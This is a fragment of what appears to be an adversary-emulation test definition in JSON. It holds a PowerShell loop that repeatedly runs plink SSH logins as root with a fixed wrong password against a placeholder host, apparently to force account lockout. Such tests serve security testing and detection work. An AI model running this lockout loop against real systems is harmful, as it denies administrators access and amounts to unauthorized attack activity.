                            "command": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n",
                            "name": "powershell",
                            "elevation_required": false
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 13:01:47"
}